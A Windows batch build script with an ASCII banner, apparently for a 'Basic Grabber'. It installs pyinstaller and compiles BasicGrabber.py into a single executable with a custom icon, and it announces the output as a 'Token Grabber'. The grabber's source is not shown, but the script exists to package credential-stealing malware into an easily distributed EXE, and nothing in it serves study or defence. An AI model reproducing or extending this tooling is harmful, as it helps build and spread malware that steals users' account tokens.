@echo off
color 0a
setlocal

rem ASCII art
echo 88""Yb Yb  dP 8888b.      88""Yb    db    .dP"Y8 88  dP""b8      dP""b8 88""Yb    db    88""Yb 88""Yb 888888 88""Yb 
echo 88__dP  YbdP   8I  Yb     88__dP   dPYb   `Ybo." 88 dP   `"     dP   `" 88__dP   dPYb   88__dP 88__dP 88__   88__dP 
echo 88"""   dPYb   8I  dY     88""Yb  dP__Yb  o.`Y8b 88 Yb          Yb  "88 88"Yb   dP__Yb  88""Yb 88""Yb 88""   88"Yb  
echo 88     dP  Yb 8888Y"      88oodP dP""""Yb 8bodP' 88  YboodP      YboodP 88  Yb dP""""Yb 88oodP 88oodP 888888 88  Yb 
echo.
echo.
echo Hi There Press any key to build...
pause>nul
cls

rem Change to the directory of the batch script
cd /d "%~dp0"

rem Install pyinstaller (if not already installed)
pip list | find "pyinstaller" > nul
if errorlevel 1 (
    echo Installing pyinstaller...
    pip install pyinstaller
)

rem Generate the executable with the custom icon
pyinstaller --onefile --icon=Icoontje.ico BasicGrabber.py

echo.
echo Token Grabber Build in Dist is the EXE
pause
